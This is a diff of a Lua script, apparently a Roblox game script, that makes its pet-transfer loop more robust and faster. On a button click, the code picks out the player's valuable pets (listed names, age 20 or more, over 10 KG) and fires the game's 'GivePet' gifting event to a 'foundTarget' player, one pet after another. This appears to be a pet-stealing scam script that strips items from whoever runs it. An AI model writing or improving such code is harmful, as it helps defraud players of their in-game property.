@@ -201,20 +201,20 @@ startBtn.MouseButton1Click:Connect(function()
     for _, tool in ipairs(backpack:GetChildren()) do
         if tool:IsA("Tool") then
             local name = tool.Name
-            local petName = name:match("^(.-) %[%d")
-            local kg = tonumber(name:match("%[(%d+%.?%d*) KG%]"))
-            local age = tonumber(name:match("%[Age (%d+)%]"))
+            local petName = name:match("^(.-) %[%d") or ""
+            local kg = tonumber(name:match("%[(%d+%.?%d*) KG%]")) or 0
+            local age = tonumber(name:match("%[Age (%d+)%]")) or 0
 
             local isTarget = table.find(targetPet, petName)
-            local isAgeValid = age and age >= 20
-            local isKGValid = kg and kg > 10
+            local isAgeValid = age >= 20
+            local isKGValid = kg > 10
 
             if isTarget or isAgeValid or isKGValid then
                 tool.Parent = character
                 ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", foundTarget)
                 wait(1)
                 tool.Parent = backpack
-                wait(0.5)
+                wait(0.2)
             end
         end
     end
